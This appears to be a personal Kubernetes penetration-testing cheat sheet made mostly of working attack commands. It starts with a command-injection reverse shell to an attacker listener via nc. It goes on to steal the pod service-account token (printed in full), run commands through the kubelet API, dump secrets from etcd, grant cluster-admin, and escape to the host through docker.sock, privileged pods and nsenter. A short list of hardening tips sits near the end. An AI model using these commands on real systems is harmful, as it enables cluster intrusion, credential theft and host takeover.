hacker: nc -lvvp 4444
pod/victim: test;nc%20192.168.159.130%204444%20-e%20/bin/ash


# some of the environment variables define the kubernetes endpoint:
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_SERVICE_PORT=443

env

MY_NC_NEXTCLOUD_SERVICE_PORT=8080
MY_NC_NEXTCLOUD_PORT=tcp://10.98.5.17:8080
API_SERVICE_PORT=80
KUBERNETES_PORT=tcp://10.96.0.1:443
KUBERNETES_SERVICE_PORT=443
API_PORT=tcp://10.110.239.230:80
WEB_LB_SERVICE_HOST=10.99.173.5
HOSTNAME=api-66f8c65894-bxgwv
MY_NC_NEXTCLOUD_PORT_8080_TCP=tcp://10.98.5.17:8080
PYTHON_PIP_VERSION=18.1
SHLVL=2
HOME=/root
API_PORT_80_TCP_ADDR=10.110.239.230
WEB_LB_SERVICE_PORT=80
WEB_LB_PORT=tcp://10.99.173.5:80
GPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D
API_PORT_80_TCP_PORT=80
API_PORT_80_TCP_PROTO=tcp
WERKZEUG_SERVER_FD=3
WEB_LB_PORT_80_TCP_ADDR=10.99.173.5
WEB_LB_PORT_80_TCP_PORT=80
WERKZEUG_RUN_MAIN=true
API_PORT_80_TCP=tcp://10.110.239.230:80
KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
WEB_LB_PORT_80_TCP_PROTO=tcp
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
LANG=C.UTF-8
MY_NC_MARIADB_PORT_3306_TCP_ADDR=10.111.200.166
MY_NC_NEXTCLOUD_SERVICE_PORT_HTTP=8080
WEB_LB_PORT_80_TCP=tcp://10.99.173.5:80
MY_NC_MARIADB_PORT_3306_TCP_PORT=3306
PYTHON_VERSION=3.6.6
MY_NC_MARIADB_SERVICE_HOST=10.111.200.166
MY_NC_MARIADB_PORT_3306_TCP_PROTO=tcp
MY_NC_MARIADB_SERVICE_PORT_MYSQL=3306
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
MY_NC_NEXTCLOUD_SERVICE_HOST=10.98.5.17
MY_NC_NEXTCLOUD_PORT_8080_TCP_ADDR=10.98.5.17
API_SERVICE_HOST=10.110.239.230
KUBERNETES_SERVICE_HOST=10.96.0.1
PWD=/app
MY_NC_NEXTCLOUD_PORT_8080_TCP_PORT=8080
MY_NC_NEXTCLOUD_PORT_8080_TCP_PROTO=tcp
MY_NC_MARIADB_SERVICE_PORT=3306
MY_NC_MARIADB_PORT=tcp://10.111.200.166:3306
MY_NC_MARIADB_PORT_3306_TCP=tcp://10.111.200.166:3306


# get info ...
mount | grep kube

tmpfs on /run/secrets/kubernetes.io/serviceaccount


cat /proc/1/cgroup

12:hugetlb:/kubepods/besteffort/pod71acd2c0-45cb-4500-a6de-a27f25704438/c1f8aca4be0115620b48d266c525c522d039b39cd272deb221c750694e28e7e7
11:cpuset:/kubepods/besteffort/pod71acd2c0-45cb-4500-a6de-a27f25704438/c1f8aca4be0115620b48d266c525c522d039b39cd272deb221c750694e28e7e7
10:cpu,cpuacct:/kubepods/besteffort/pod71acd2c0-45cb-4500-a6de-a27f25704438/c1f8aca4be0115620b48d266c525c522d039b39cd272deb221c750694e28e7e7
9:memory:/kubepods/besteffort/pod71acd2c0-45cb-4500-a6de-a27f25704438/c1f8aca4be0115620b48d266c525c522d039b39cd272deb221c750694e28e7e7
8:devices:/kubepods/besteffort/pod71acd2c0-45cb-4500-a6de-a27f25704438/c1f8aca4be0115620b48d266c525c522d039b39cd272deb221c750694e28e7e7
7:rdma:/
6:blkio:/kubepods/besteffort/pod71acd2c0-45cb-4500-a6de-a27f25704438/c1f8aca4be0115620b48d266c525c522d039b39cd272deb221c750694e28e7e7
5:pids:/kubepods/besteffort/pod71acd2c0-45cb-4500-a6de-a27f25704438/c1f8aca4be0115620b48d266c525c522d039b39cd272deb221c750694e28e7e7
4:perf_event:/kubepods/besteffort/pod71acd2c0-45cb-4500-a6de-a27f25704438/c1f8aca4be0115620b48d266c525c522d039b39cd272deb221c750694e28e7e7
3:net_cls,net_prio:/kubepods/besteffort/pod71acd2c0-45cb-4500-a6de-a27f25704438/c1f8aca4be0115620b48d266c525c522d039b39cd272deb221c750694e28e7e7
2:freezer:/kubepods/besteffort/pod71acd2c0-45cb-4500-a6de-a27f25704438/c1f8aca4be0115620b48d266c525c522d039b39cd272deb221c750694e28e7e7
1:name=systemd:/kubepods/besteffort/pod71acd2c0-45cb-4500-a6de-a27f25704438/c1f8aca4be0115620b48d266c525c522d039b39cd272deb221c750694e28e7e7
0::/system.slice/containerd.service



# every pod has a token file located inside /run/secrets/kubernetes.io/serviceaccount/token that can be used to access k8s api
export TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)


echo $TOKEN
eyJhbGciOiJSUzI1NiIsImtpZCI6IjRNYnNSREc3MklzenA2N3JxN0hsdFZzWUI5VGYzZUF3MkU4T0dBazBia2MifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjQ5OTIwMjU0LCJpYXQiOjE2MTgzODQyNTQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJhcGktNjZmOGM2NTg5NC1ieGd3diIsInVpZCI6IjcxYWNkMmMwLTQ1Y2ItNDUwMC1hNmRlLWEyN2YyNTcwNDQzOCJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjYxMjQwYTg1LTc0MjAtNDNmMy1hMWE2LTE1Zjk2NDAxMWU0NCJ9LCJ3YXJuYWZ0ZXIiOjE2MTgzODc4NjF9LCJuYmYiOjE2MTgzODQyNTQsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.GQornwMA_mY2PFJIF5ItgqqfOWEBFG8KWbKdU81RLfRNZxfDJmu050VaUsfQSWblBhbWenpdtxD3CCPaELzAUvV3xKv-8IhTTcHfVoOU3xHjb6zVaCXuvurkY37pHNWNeQC2G8zdQfHjxDjKwg09d0kz8jPIvKbSC7SC5B4VTJkVZl3lfs-fNJs8dptbICBjsGfqkww7xQFto7yGQ59p41uL8wYDTrBJq45V8NCRlaXqbOijYsH1s2GpyC4bZsyCNGCFv8WLDOGQ1g4zD3Q4L0Gb-4HbBwCpw_yuVJJ8zl2MnRgZsETydZVwgXIgW0xJO_1ggnPA3yha5KVTlrS0Mw


using the api
-------------------------------

https://192.168.159.129:6443/api/v1/namespaces/kube-system/secrets?fieldSelector=type%3Dbootstrap.kubernetes.io%2Ftoken

https://192.168.154.128:10250/containerLogs/kube-system/calico-node-hdqvb/calico-node


# requires adding permissions to the default SA
wget https://10.96.0.1/api/v1/namespaces/default/pods --header="Authorization: Bearer $TOKEN" --no-check-certificate 2>&1


# requires turning on the insecure port in the api-server yaml file (/etc/kubernetes/manifests/kube-apiserver.yaml)
curl http://master-ip:8080/api
 

# requires adding anonymous access to the kubelet api (via /var/lib/kubelet/config.yaml)
curl -k https://192.168.159.128:10250/runningpods

curl -k https://192.168.159.128:10250/run/<namespace-name>/<pod-name>/api

curl -k https://192.168.159.128:10250/run/<namespace-name>/<pod-name>/api -X POST -d "cmd=<system cmd>"

curl -k https://192.168.159.128:10250/run/default/api-59df8f56b5-z9744/api -X POST -d "cmd=ls -l"

curl -k https://192.168.159.128:10250/logs/auth.log



# using etcdctl to get secrets 

curl -OL https://github.com/etcd-io/etcd/releases/download/v3.2.32/etcd-v3.2.32-linux-amd64.tar.gz

# needed for interacting with newer etcd versions using an older syntax
export ETCDCTL_API=3

./etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt --key=/etc/kubernetes/pki/etcd/healthcheck-client.key get / --prefix --keys-only

./etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt --key=/etc/kubernetes/pki/etcd/healthcheck-client.key get / --prefix --keys-only | grep '<secret-name-to-look-for>'

./etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt --key=/etc/kubernetes/pki/etcd/healthcheck-client.key get /registry/secrets/<namespace-name>/<secret-name>/ 

./etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt --key=/etc/kubernetes/pki/etcd/healthcheck-client.key snapshot save my-etcd-backup.db

strings my-etcd-backup.db | grep '<password-to-look-for>'


#newer syntax:

# not working: ./etcdctl --endpoints=https://127.0.0.1:2379 --ca-file=/etc/kubernetes/pki/etcd/ca.crt --cert-file=/etc/kubernetes/pki/etcd/healthcheck-client.crt --key-file=/etc/kubernetes/pki/etcd/healthcheck-client.key get /



cat /etc/kubernetes/pki/etcd/healthcheck-client.crt >> c.crt
cat /etc/kubernetes/pki/etcd/healthcheck-client.key >> c.crt

curl -v --cert c.crt -k https://127.0.0.1:2379/version

curl --cert c.crt -Lvk https://localhost:2379/v3/kv/put -X POST -d '{"key": "Zm9v", "value": "YmFy"}'



# dashboard

kubectl apply -f https://raw.githubusercontent.com/kubernetes/dashboard/v2.0.0/aio/deploy/recommended.yaml

kubectl proxy

# add permissions

# Create service account
kubectl create serviceaccount -n kube-system cluster-admin-dashboard-sa

# Bind ClusterAdmin role to the service account
kubectl create clusterrolebinding -n kube-system cluster-admin-dashboard-sa \
  --clusterrole=cluster-admin \
  --serviceaccount=kube-system:cluster-admin-dashboard-sa

# Parse the token
TOKEN=$(kubectl describe secret -n kube-system $(kubectl get secret -n kube-system | awk '/^cluster-admin-dashboard-sa-token-/{print $1}') | awk '$1=="token:"{print $2}')

browse: http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/
http://localhost:8001/api/v1/namespaces/<namespace-in-which-the-kubernetes-dashboard-pod-runs>/services/https:kubernetes-dashboard:/proxy/




# get default token 
kubectl -n kube-system describe secret default




use docker to get to k8s
-----------------------------


export DOCKER_HOST=unix:///var/run/docker.sock

export DOCKER_HOST=unix:///tmp/docker.sock

cd /var/run

ln -s /host/var/run/docker/docker.sock docker.sock

assign yourself the GID of the docker.sock file when building the user inside the image if needed.

kubectl exec alpine-with-link-to-docker-socket


docker run -it --privileged --pid=host repository.local/alpine:3.14.0 nsenter -t 1 -m -u -i sh






overrides examples
--------------------------

overrides='{ "spec": { "hostPID": false, "hostNetwork": false, "securityContext": { "runAsUser": 0 }, "containers": [ { "securityContext": { "privileged": false }, "image": "bitnami/nginx", "name": "nsenter", "stdin": true, "stdinOnce": true, "tty": true, "command": [ "sh" ] } ], "tolerations": [ { "key": "CriticalAddonsOnly", "operator": "Exists" }, { "effect": "NoExecute", "operator": "Exists" } ] } }'


overrides='{ "spec": { "securityContext": { "runAsUser": 0 }}}'
k run --image=bitnami/nginx --overrides="$overrides" -ti nginx-as-root sh




k8s services run commands:
--------------------------------

etcd
------------

etcd --advertise-client-urls=https://192.168.154.143:2379 --cert-file=/etc/kubernetes/pki/etcd/server.crt --client-cert-auth=true --data-dir=/var/lib/etcd --initial-advertise-peer-urls=https://192.168.154.143:2380 --initial-cluster=master=https://192.168.154.143:2380 --key-file=/etc/kubernetes/pki/etcd/server.key --listen-client-urls=https://127.0.0.1:2379,https://192.168.154.143:2379 --listen-metrics-urls=http://127.0.0.1:2381 --listen-peer-urls=https://192.168.154.143:2380 --name=master --peer-cert-file=/etc/kubernetes/pki/etcd/peer.crt --peer-client-cert-auth=true --peer-key-file=/etc/kubernetes/pki/etcd/peer.key --peer-trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt --snapshot-count=10000 --trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt


api-server
-----------------

kube-apiserver --advertise-address=192.168.154.143 --allow-privileged=true --authorization-mode=Node,RBAC --client-ca-file=/etc/kubernetes/pki/ca.crt --enable-admission-plugins=NodeRestriction --enable-bootstrap-token-auth=true --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key --etcd-servers=https://127.0.0.1:2379 --insecure-port=0 --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname --proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt --proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key --requestheader-allowed-names=front-proxy-client --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt --requestheader-extra-headers-prefix=X-Remote-Extra- --requestheader-group-headers=X-Remote-Group --requestheader-username-headers=X-Remote-User --secure-port=6443 --service-account-issuer=https://kubernetes.default.svc.cluster.local --service-account-key-file=/etc/kubernetes/pki/sa.pub --service-account-signing-key-file=/etc/kubernetes/pki/sa.key --service-cluster-ip-range=10.96.0.0/12 --tls-cert-file=/etc/kubernetes/pki/apiserver.crt --tls-private-key-file=/etc/kubernetes/pki/apiserver.key


kubelet
-----------------------

/usr/bin/kubelet --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf --config=/var/lib/kubelet/config.yaml --network-plugin=cni --pod-infra-container-image=k8s.gcr.io/pause:3.4.1



kube-controller-manager
------------------------------

kube-controller-manager --authentication-kubeconfig=/etc/kubernetes/controller-manager.conf --authorization-kubeconfig=/etc/kubernetes/controller-manager.conf --bind-address=127.0.0.1 --client-ca-file=/etc/kubernetes/pki/ca.crt --cluster-name=kubernetes --cluster-signing-cert-file=/etc/kubernetes/pki/ca.crt --cluster-signing-key-file=/etc/kubernetes/pki/ca.key --controllers=*,bootstrapsigner,tokencleaner --kubeconfig=/etc/kubernetes/controller-manager.conf --leader-elect=true --port=0 --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt --root-ca-file=/etc/kubernetes/pki/ca.crt --service-account-private-key-file=/etc/kubernetes/pki/sa.key --use-service-account-credentials=true






General notes:
-----------------------------------------

* perl exists by default in Ubuntu

* nc and wget exist as BUILT-IN cmds in Alpine as part of Busybox (symbolic links to the same binary)

* make sure that 'sudo' does not exist inside pods and/or that the one present is not vulnerable (there is a CVE)

* docker uses https but you can bypass that by running the socat binary and open a tcp port that connects to the socket. after that you can use docker's -H switch to connect to that tcp port and send docker commands that will be seen in the socat logs on the console where the socat cmd was ran.

* new privs escalation to test - CVE-2021-33909

* a user may gain access to sensitive resources just by assigning it to root group (uid = 0) when creating an image

* strace will not run from within docker even as root unless the relevant capability will be added explicitly to the docker run command. E.g.: docker run -it --cap-add=SYS_PTRACE 8e2d606e619f bash



* make sure that 'sudo' does not exist inside pods and/or that the one present is not vulnerable (there is a CVE)

* run pods as standard users only

* remove unneeded tools such as networking tools, db clients etc.

* for debugging use a dedicated pod that will be deployed on-demand and will be removed when the debugging is done

* make sure to set the GID as non-root user as well as the user itself because the default GID is ROOT.

* make sure that an app is ran by a non-root user AND that user has ONLY READ privs on the app files (so that no one other than root can EDIT the files) 




Attack vectors:
-----------------------------------------

1. deployment yaml: psp with privileged mode and pid -> root pod -> nsenter -> root on host

2. deployment yaml: psp with mount to docker.socket -> user pod with docker client -> docker run --privileged --pid=host <pod> nsenter -> root on host
      -> if the socket is not on the default location or a direct mount point via the yaml is not available, use the env var DOCKER_HOST to change its location before using the docker binary.

3. deployment yaml: psp with privileged mode, pid and "runAsUser=0" -> user pod -> nsenter -> root on host

4. deployment yaml: psp with mount to host root fs -> run any pod with chroot in it -> exec using 'chroot /host sh' -> run 'bash' -> root on host